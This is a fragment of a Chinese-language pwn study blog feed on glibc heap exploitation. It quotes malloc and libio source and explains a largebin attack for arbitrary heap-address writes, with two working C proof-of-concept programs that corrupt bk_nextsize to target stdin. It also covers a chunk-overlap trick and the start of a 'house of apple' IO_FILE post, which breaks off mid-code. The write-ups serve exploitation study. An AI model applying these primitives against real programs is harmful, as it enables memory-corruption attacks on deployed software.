class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>























<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://www.anquanke.com/post/id/177958">https://www.anquanke.com/post/id/177958</a></p>
<p><a href="https://www.anquanke.com/post/id/177910">https://www.anquanke.com/post/id/177910</a></p>
<p><a href="https://tttang.com/archive/1279/#toc_0x00">https://tttang.com/archive/1279/#toc_0x00</a></p>
]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>POC for LagerbinAttach</title>
    <url>/2024/08/19/userpwn/LargerbinAttach/</url>
    <content><![CDATA[<h1 id="关于largebin"><a href="#关于largebin" class="headerlink" title="关于largebin"></a>关于largebin</h1><p><img src="/../../../themes/butterfly/source/img/mypic/userpwn/largebin.png" alt="largebin">图片来源：[<a href="https://bbs.kanxue.com/thread-262424.htm#msg_header_h2_3">原创]Largebin attack总结-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
<h1 id="任意地址写入堆地址"><a href="#任意地址写入堆地址" class="headerlink" title="任意地址写入堆地址"></a>任意地址写入堆地址</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>需要存在uaf漏洞，也就是可以修改largebin的bcksize字段</span><br><span class="line"><span class="number">2.</span>需要申请足够多的堆块（用于隔离和清空unsortedbin）</span><br></pre></td></tr></table></figure>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
<p>主要是largechunk入链的时候的漏洞,若unsortedbin中没有合适堆块，则会将unsortedbin中的堆块放到smallbin和lagerbin中。完整代码：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = smallbin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">           &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = largebin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">             <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">               &#123;</span><br><span class="line">                 <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                 size |= PREV_INUSE;</span><br><span class="line">                 <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                 assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">	      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;</span><br><span class="line">                     bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">                     <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                       &#123;</span><br><span class="line">                         fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">		  assert (chunk_main_arena (fwd));</span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">		  == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                       <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                       fwd = fwd-&gt;fd;</span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                       &#123;</span><br><span class="line">                         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                         <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                           malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                       &#125;</span><br><span class="line">                     bck = fwd-&gt;bk;</span><br><span class="line">                     <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                       malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">         mark_bin (av, victim_index);</span><br><span class="line">         victim-&gt;bk = bck;</span><br><span class="line">         victim-&gt;fd = fwd;</span><br><span class="line">         fwd-&gt;bk = victim;</span><br><span class="line">         bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>利用点：主要集中在这几行上面，如果可以覆盖fwd的bcksize字段，那么就可以将bcksize的+0x20处的值覆盖为victim的地址，实现任意地址写堆地址的目的，可以结合iofile构造io链使用，但是在高版本的情形下已经打上了补丁<code>malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</code>检查了size双向链表的完整性，使此利用方法成为历史。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>但是下述代码没有检查，或许成为突破口。条件为，堆块在同一个bin中最小，且可以控制第一个堆块的bcksize字段，那么也可以形成上述攻击。。。。但是有可能我想错了。。。。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">	      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;</span><br><span class="line">                     bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure>

<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><blockquote>
<p>测试攻击有效性的demo，</p>
<p>GLIBC2.7,不知道低版本的编译器有什么bug，编译连接之后printf有的指令需要栈对齐才能用，但是编译器没有考虑，所以就把printf注释掉了，Glibc2.23可正常使用，就不再写一遍了。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc-7 -c largebin-attach.c -o lar2.7.o</span></span><br><span class="line"><span class="comment">ld --dynamic-linker=/home/l/how2heap/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/ld-2.27.so    --rpath=/home/l/how2heap/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64    lar2.7.o -o lar2.7 -lc</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">void</span> *la = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="type">void</span> *junk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">void</span> *lb = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">    <span class="comment">/*保护chunk，防止释放与top合并*/</span></span><br><span class="line">    <span class="type">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*进入unsorted bin */</span></span><br><span class="line">    <span class="built_in">free</span>(la);</span><br><span class="line">    <span class="comment">/*此时unsortedbin中chunk会被放到largerbin[64]中 */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x800</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    此时的largerbin[64]的简略布局：</span></span><br><span class="line"><span class="comment">    lb-&gt;la</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//printf(&quot;%p\n&quot;,la);</span></span><br><span class="line">    <span class="type">long</span> *value = (<span class="type">long</span> *)(*((<span class="type">long</span>*)la+<span class="number">3</span>));</span><br><span class="line">    <span class="comment">//printf(&quot;la-&gt;bcksize = %p\n&quot;,value);</span></span><br><span class="line">    <span class="comment">/*覆盖la-&gt;bcksize */</span></span><br><span class="line">    <span class="type">long</span> *tmp = (<span class="type">long</span>*)la+<span class="number">3</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;_IO_2_1_stdin_ address = %p\n&quot;,stdin);</span></span><br><span class="line">    *tmp = (<span class="type">long</span> *)&amp;<span class="built_in">stdin</span><span class="number">-4</span>;</span><br><span class="line">    <span class="comment">/*attach start*/</span></span><br><span class="line">    <span class="built_in">free</span>(lb);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x800</span>);</span><br><span class="line">    <span class="comment">//printf(&quot;fake _IO_2_1_stdin_ address = %p\n&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>GLIBC2.35,没想到这种版本居然也可以利用,只需要保证释放的堆块是最小的即可（交换la和lb的顺序），源码中已经分析过了没有检查，不知道再高的版本修复了没有。。。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">void</span> *la = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">    <span class="type">void</span> *junk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">void</span> *lb = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="comment">/*保护chunk，防止释放与top合并*/</span></span><br><span class="line">    <span class="type">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*进入unsorted bin */</span></span><br><span class="line">    <span class="built_in">free</span>(la);</span><br><span class="line">    <span class="comment">/*此时unsortedbin中chunk会被放到largerbin[64]中 */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x800</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    此时的largerbin[64]的简略布局：</span></span><br><span class="line"><span class="comment">    lb-&gt;la</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,la);</span><br><span class="line">    <span class="type">long</span> *value = (<span class="type">long</span> *)(*((<span class="type">long</span>*)la+<span class="number">3</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;la-&gt;bcksize = %p\n&quot;</span>,value);</span><br><span class="line">    <span class="comment">/*覆盖la-&gt;bcksize */</span></span><br><span class="line">    <span class="type">long</span> *tmp = (<span class="type">long</span>*)la+<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_2_1_stdin_ address = %p\n&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    *tmp = (<span class="type">long</span> *)&amp;<span class="built_in">stdin</span><span class="number">-4</span>;</span><br><span class="line">    <span class="comment">/*attach start*/</span></span><br><span class="line">    <span class="built_in">free</span>(lb);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x800</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake _IO_2_1_stdin_ address = %p\n&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="实现overlap"><a href="#实现overlap" class="headerlink" title="实现overlap"></a>实现overlap</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">	      &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (victim)</span><br><span class="line">	        &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">		  &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">		    == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>利用如下语句来实现overlap</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">               victim = victim-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure>

<p>也就是哥哥该bk_nextsize字段，使其指向未释放的largebin，就可以实现，在此largebin中构造fd和bk绕过unlink，并且使nextsize域为空，绕过大块如链过程，然后就可以实现unlink攻击的效果。</p>
]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>POC for SmallbinAttach</title>
    <url>/2024/08/19/userpwn/SmallbinAttach/</url>
    <content><![CDATA[<blockquote>
<p>感觉挺恶心的回来用的时候再学吧（应用范围貌似没那么广）。</p>
</blockquote>
]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>fmtstr一些源码学习</title>
    <url>/2024/08/13/userpwn/fmtstr/</url>
    <content><![CDATA[<h2 id="1-printf"><a href="#1-printf" class="headerlink" title="1. printf"></a>1. printf</h2><h3 id="a-printf"><a href="#a-printf" class="headerlink" title="a.__printf"></a>a.__printf</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;</span><br><span class="line">  <span class="type">int</span> done;</span><br><span class="line"></span><br><span class="line">  va_start (arg, format);</span><br><span class="line">  done = __vfprintf_internal (<span class="built_in">stdout</span>, format, arg, <span class="number">0</span>);</span><br><span class="line">  va_end (arg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_printf</span></span><br><span class="line">ldbl_strong_alias (__printf, <span class="built_in">printf</span>);</span><br><span class="line">ldbl_strong_alias (__printf, _IO_printf);</span><br></pre></td></tr></table></figure>

<h3 id="b-vfprintf-internal"><a href="#b-vfprintf-internal" class="headerlink" title="b.__vfprintf_internal"></a>b.__vfprintf_internal</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>house of apple</title>
    <url>/2024/08/23/userpwn/applepoc/</url>
    <content><![CDATA[<blockquote>
<p>参考文章地址：<a href="https://bbs.kanxue.com/thread-273418.htm">https://bbs.kanxue.com/thread-273418.htm</a></p>
</blockquote>
<h1 id="APPLE1"><a href="#APPLE1" class="headerlink" title="APPLE1"></a>APPLE1</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="IO-wstrnfile-IO-wide-data"><a href="#IO-wstrnfile-IO-wide-data" class="headerlink" title="_IO_wstrnfile &amp;_IO_wide_data"></a>_IO_wstrnfile &amp;_IO_wide_data</h3><blockquote>
<p>重点知道overflow_buf的位置。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_strfile f;</span><br><span class="line">  <span class="comment">/* This is used for the characters which do not fit in the buffer</span></span><br><span class="line"><span class="comment">     provided by the user.  */</span></span><br><span class="line">  <span class="type">wchar_t</span> overflow_buf[<span class="number">64</span>];</span><br><span class="line">&#125; _IO_wstrnfile;</span><br><span class="line">------------</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line">------------</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* These members are preserved for ABI compatibility.  The glibc</span></span><br><span class="line"><span class="comment">     implementation always calls malloc/free for user buffers if</span></span><br><span class="line"><span class="comment">     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line">-----------</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">-------------</span><br><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="主要利用函数"><a href="#主要利用函数" class="headerlink" title="主要利用函数"></a>主要利用函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*vswprintf.c*/</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstrn_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">		 snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">				      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">				      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">					 / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply 